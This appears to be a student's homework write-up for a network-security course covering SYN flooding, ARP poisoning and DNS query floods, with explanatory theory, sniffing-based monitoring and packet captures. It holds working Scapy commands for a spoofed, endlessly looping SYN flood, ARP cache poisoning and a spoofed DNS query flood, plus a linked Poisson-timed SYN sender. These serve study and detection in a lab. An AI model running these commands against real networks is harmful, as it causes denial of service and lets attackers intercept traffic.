# MIE-SIB. Homework #1. 

### 1, TCP/SYN Packet (TCP/SYN Flood)

###### Theoretical overview

A **SYN flood** is a form of denial-of-service attack in which an attacker sends a succession of SYN requests to a target's system in an attempt to consume enough server resources to make the system unresponsive to legitimate traffic.

Normally when a client attempts to start a TCP connection to a server, the client and server exchange a series of messages which normally runs like this:

1. The client requests a connection by sending a SYN (synchronize) message to the server.
2. The server acknowledges this request by sending SYN-ACK back to the client.
3. The client responds with an ACK, and the connection is established.

This is called the **TCP three-way handshake**, and is the foundation for every connection established using the TCP protocol.

![Normal work](http://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Tcp_normal.svg/220px-Tcp_normal.svg.png)

A **SYN flood attack** works by not responding to the server with the expected ACK code. The malicious client can either simply not send the expected ACK, or by spoofing the source IP address in the SYN, causing the server to send the SYN-ACK to a falsified IP address - which will not send an ACK because it "knows" that it never sent a SYN.

The server will wait for the acknowledgement for some time, as simple network congestion could also be the cause of the missing ACK, but in an attack increasingly large numbers of half-open connections will bind resources on the server until no new connections can be made, resulting in a denial of service to legitimate traffic. Some systems may also malfunction badly or even crash if other operating system functions are starved of resources in this way.

![SYN Flood](http://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Tcp_synflood.png/220px-Tcp_synflood.png)


###### Using Scapy for performing attacks.

	send(IP(src=RandIP('10.0.0.0/8'), dst='172.16.16.16')/TCP(sport=RandShort(), dport=80), loop=1) 

Scapy generates `TCP SYN` packets at a constant rate to the victim with `address 172.16.16.16` on `port 80`, sourced from random spoofed addresses within the allowed management network (`10.0.0.0/8`). Appending the `loop=1` parameter to scapy's send() command instructs it to regenerate and retransmit the packet at a constant rate indefinitely. 

On the victim router, we can see that the TCP connection queue is immediately exhausted: 

	02:15:49.007776 IP 10.183.157.9.35319 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.008966 IP 10.143.122.81.61439 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.010057 IP 10.23.145.69.45972 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.011082 IP 10.36.20.15.23697 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.012211 IP 10.237.52.92.34983 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.013442 IP 10.37.190.76.20831 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.014706 IP 10.36.141.23.4999 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.015997 IP 10.200.164.146.33124 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.017994 IP 10.131.175.162.38615 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.019118 IP 10.46.64.11.48947 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.020234 IP 10.133.81.101.52032 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.021436 IP 10.253.244.76.18717 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.022464 IP 10.66.75.205.27219 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.023491 IP 10.202.188.247.11763 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.024614 IP 10.82.193.102.54673 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.025861 IP 10.150.235.34.29320 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.027553 IP 10.231.145.11.58377 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	02:15:49.029261 IP 10.145.105.136.60844 > 172.16.16.16.www: Flags [S], seq 0, win 8192, length 0
	
###### Using Scapy for monitoring attacks.

We can easily capture `tcp` packets with `S flag`:

	a = sniff(filter="tcp[tcpflags] & (tcp-syn) != 0")
	a.nsummary()

Displayed information:
	
	0000 Ether / IP / TCP 10.86.233.36:25701 > 172.16.16.16:www S
	0001 Ether / IP / TCP 10.155.28.58:56047 > 172.16.16.16:www S
	0002 Ether / IP / TCP 10.79.88.202:60566 > 172.16.16.16:www S
	0003 Ether / IP / TCP 10.95.55.197:64929 > 172.16.16.16:www S
	0004 Ether / IP / TCP 10.177.194.62:1856 > 172.16.16.16:www S
	0005 Ether / IP / TCP 10.236.101.170:21069 > 172.16.16.16:www S
	0006 Ether / IP / TCP 10.236.110.58:16205 > 172.16.16.16:www S
	0007 Ether / IP / TCP 10.40.112.40:63280 > 172.16.16.16:www S
	0008 Ether / IP / TCP 10.216.122.157:16823 > 172.16.16.16:www S
	0009 Ether / IP / TCP 10.66.169.3:60749 > 172.16.16.16:www S
	0010 Ether / IP / TCP 10.61.157.51:48726 > 172.16.16.16:www S
	0011 Ether / IP / TCP 10.73.11.92:55115 > 172.16.16.16:www S
	0012 Ether / IP / TCP 10.115.49.253:23161 > 172.16.16.16:www S

### 2, ARP Poisoning.

###### Theoretical overview

**ARP (address resolution protocol)** operates by broadcasting a message across a network, to determine the Layer 2 address (MAC address) of a host with a predefined Layer 3 address (IP address). The host at the destination IP address sends a reply packet containing its MAC address. Once the initial ARP transaction is complete, the originating device then caches the ARP response, which is used within the Layer 2 header of packets that are sent to a specified IP address.

![ARP poisoning](http://hakipedia.com/images/MitM.png)

An **ARP Spoofing attack** is the egression of unsolicited ARP messages. These ARP messages contain the IP address of a network resource, such as the default gateway, or a DNS server, and replaces the MAC address for the corresponding network resource with its own MAC address. Network devices, by design, overwrite any existing ARP information in conjunction with the IP address, with the new, counterfeit ARP information. The attacker then takes the role of man in the middle; any traffic destined for the legitimate resource is sent through the attacking system. As this attack occurs on the lower levels of the OSI model, the end-user is oblivious to the attack occurrence.

**ARP Poisoning** is also capable of executing Denial of Service (DoS) attacks. The attacking system, instead of posing as a gateway and performing a man in the middle attack, can instead simply drop the packets, causing the clients to be denied service to the attacked network resource. The spoofing of ARP messages is the tributary principal of ARP Poisoning.

###### Using Scapy for performing attacks.

Exists high-level function that is already coded `arpcachepoison`. That performs poison target's cache with (your MAC,victim's IP) couple.

	arpcachepoison('172.16.16.16', '10.0.0.1')

Will cause `172.16.16.16` to send the current host all packets originally intended for `10.0.0.1`.

Also it can be done in different way by using standart functions:

	a = ARP()

Now, target and victims ip addresses are set.

	a.psrc=("10.0.0.1")
	a.pdst=("172.16.16.16")

Send packet.

	send(a)

###### Using Scapy for monitoring attacks.

We should capture `arp` packets:

	a =sniff(filter="arp")
	a.summary()
	
Result on target side looks like:

	Ether / ARP who has 172.16.16.16 says 10.0.0.1
	

### 3, DNS query (DNS Multiplication Attack)

###### Theoretical overview

A **DNS query** is the process of a networking device making an inquiry to get an IP address for a DNS name. 

The client computer will send a DNS query to one of their DNS servers. The DNS server looks in it's DNS database to tell whether it can answer the query authoritatively. If the DNS server can answer authoritatively, the DNS server answers the query and the DNS query process is complete... *further stages are not interested for us within the bounds of this task*.

![ARP poisoning](http://www.ingate.com/files/422/fwmanual-en/png-img/fw-acdns1-en.png)

###### Using Scapy for performing attacks.

	sr1(IP(src=RandIP('10.0.0.0/8'), dst='172.16.16.16')/UDP(sport=RandShort(),dport=53)/
	... DNS(rd=1,qd=DNSQR(qname="fit.cvut.cz", qtype="AAAA")))
	
DNS query to the DNS server at `172.16.16.16` from random ip addresses `10.0.0.0/8`. The request is about presence IPv6 records type `AAAA` for the domain `fit.cvut.cz`.

`rd=1` is telling that recursion is desired, and `sr1` is the send/receive function that only returns the first answered packet.

###### Using Scapy for monitoring attacks.

We should capture `udp` packets at `port 53`:

	a=sniff(filter="udp and port 53")
	a.summary();

and result is:

	Ether / IP / UDP / DNS Qry "fit.cvut.cz." 
	
### 4. *C* program for monitoring of TCP/SYN packets.

Program is available for downloads from [here](https://github.com/platomik/MIE-SIB/blob/master/homework1/tcpsynsniffer.c "tcpsynsniffer").

######Description: 
The program captures ip packets and print out information about TCP/SYN packets only. 

######Compile with:

	gcc tcpsynsniffer.c -lpcap (-o tcpsynsniffer) 

######Usage:

	a.out

######Output:

	61/88 TCP:SYN        From: 10.92.23.150:28509         To: 172.16.16.16:80

Printed `61st` packet of `88` currently observed. Packet is `TCP/SYN` type. From source address `10.92.23.150` port `28509` to destination address `172.16.16.16` port `80`.

######SYN flood:
If we perform a packet generation by Scapy from TCP/SYN flood example in the 1st part of the homework:

	send(IP(src=RandIP('10.0.0.0/8'), dst='172.16.16.16')/TCP(sport=RandShort(), dport=80), loop=1) 

We will get such output of program `tcpsynsniffer` execution:

	1/5 TCP:SYN          From: 10.245.71.56:61343          To: 172.16.16.16:80
	2/6 TCP:SYN          From: 10.44.145.235:31764         To: 172.16.16.16:80
	3/7 TCP:SYN          From: 10.60.84.72:6057            To: 172.16.16.16:80
	4/8 TCP:SYN          From: 10.13.80.184:7713           To: 172.16.16.16:80
	5/9 TCP:SYN          From: 10.97.136.97:26323          To: 172.16.16.16:80
	6/12 TCP:SYN         From: 10.109.33.211:1354          To: 172.16.16.16:80
	7/13 TCP:SYN         From: 10.245.218.53:27024         To: 172.16.16.16:80
	8/14 TCP:SYN         From: 10.48.149.41:31992          To: 172.16.16.16:80
	9/15 TCP:SYN         From: 10.86.236.178:23626         To: 172.16.16.16:80
	10/16 TCP:SYN        From: 10.106.139.241:33214        To: 172.16.16.16:80
	11/17 TCP:SYN        From: 10.70.82.100:53481          To: 172.16.16.16:80
	12/18 TCP:SYN        From: 10.243.166.57:11644         To: 172.16.16.16:80
	13/19 TCP:SYN        From: 10.189.162.243:7244         To: 172.16.16.16:80
	14/22 TCP:SYN        From: 10.222.107.93:34402         To: 172.16.16.16:80
	15/23 TCP:SYN        From: 10.181.18.28:38302          To: 172.16.16.16:80
	16/24 TCP:SYN        From: 10.8.62.158:42174           To: 172.16.16.16:80
	17/25 TCP:SYN        From: 10.183.106.185:57508        To: 172.16.16.16:80
	18/26 TCP:SYN        From: 10.140.35.123:48808         To: 172.16.16.16:80
	19/27 TCP:SYN        From: 10.35.46.139:10663          To: 172.16.16.16:80
	20/28 TCP:SYN        From: 10.250.181.239:8775         To: 172.16.16.16:80

So here we can see flooding TCP/SYN packets on target server `172.16.16.16` at port `80`.

######Notes:
The program has a constant for number of packets to capture. By default this number is equal 100. It could be easily changed in the source code:

    int num_packets = 100;           /* number of packets to capture */

When program captured `num_packets` (default value, 100), it stopped even if none of TCP/SYN packets is found.

### 5. Send the intruding packets with random timing according to a Poisson Process with rate lambda (the parameter)

Simple program on python allows sending TCP/SYN packets from a random src address with a random interval according to a Poisson Process. The program is [here](https://github.com/platomik/MIE-SIB/blob/master/homework1/extra.py "extra").

######Usage from command line:

	>extra.py 0.5

where parameter `0.5` is lambda.

######Comments
In the program *loop with delay* was used. Delay is defined by python function `random.expovariate`

**random.expovariate(lambd)**
	Exponential distribution. lambd is 1.0 divided by the desired mean. It should be nonzero. (The parameter would be called “lambda”, but that is a reserved word in Python.) Returned values range from 0 to positive infinity if lambd is positive, and from negative infinity to 0 if lambd is negative.